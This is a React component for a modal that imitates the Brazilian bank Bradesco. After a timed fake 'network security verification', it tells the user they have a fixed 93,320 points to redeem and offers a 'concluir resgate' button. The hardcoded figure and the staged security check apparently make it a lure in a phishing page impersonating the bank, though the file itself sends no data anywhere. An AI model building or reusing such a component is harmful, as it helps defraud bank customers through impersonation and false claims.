import { useState, useEffect } from "react";
import bradescoLogo from "@/assets/bradesco-logo-new.webp";

interface ProcessingModalProps {
  open: boolean;
  userName: string;
  onComplete: () => void;
}

const ProcessingModal = ({ open, userName, onComplete }: ProcessingModalProps) => {
  const [phase, setPhase] = useState(0);

  useEffect(() => {
    if (!open) {
      setPhase(0);
      return;
    }

    const timer1 = setTimeout(() => setPhase(1), 5000);
    const timer2 = setTimeout(() => setPhase(2), 10000);

    return () => {
      clearTimeout(timer1);
      clearTimeout(timer2);
    };
  }, [open]);

  if (!open) return null;

  return (
    <div className="fixed inset-0 z-50 flex items-end justify-center sm:items-center">
      <div className="fixed inset-0 bg-[hsl(var(--overlay))]" />
      <div className="relative z-50 w-full max-w-sm mx-4 mb-8 bg-card rounded-2xl p-8 shadow-xl animate-slide-up flex flex-col items-center">
        {phase < 2 ? (
          <>
            <img src={bradescoLogo} alt="Bradesco" className="h-12 mb-6 animate-[pulse_2s_ease-in-out_infinite]" />
            <p className="text-muted-foreground text-base mb-6 text-center">
              {phase === 0 ? "Processando" : "Verificando segurança do ambiente da rede"}
            </p>
            <div className="w-10 h-10 border-3 border-muted rounded-full border-t-primary animate-spin mb-4" />
          </>
        ) : (
          <>
            <img src={bradescoLogo} alt="Bradesco" className="h-12 mb-6" />
            <p className="text-card-foreground text-lg font-medium text-center mb-1">
              Você possui <span className="text-primary font-bold">93.320</span> pontos
            </p>
            <p className="text-card-foreground text-lg font-medium text-center mb-6">
              disponíveis para resgate
            </p>
            <button
              onClick={onComplete}
              className="px-8 py-3 rounded-full bg-gradient-to-r from-primary to-[hsl(345,60%,40%)] text-primary-foreground font-semibold text-base hover:opacity-90 transition-opacity"
            >
              concluir resgate
            </button>
          </>
        )}
        <div className="mt-4 w-full flex justify-center">
          <div className="w-8 h-8 border-2 border-muted rounded-full border-t-primary animate-spin" />
        </div>
      </div>
    </div>
  );
};

export default ProcessingModal;
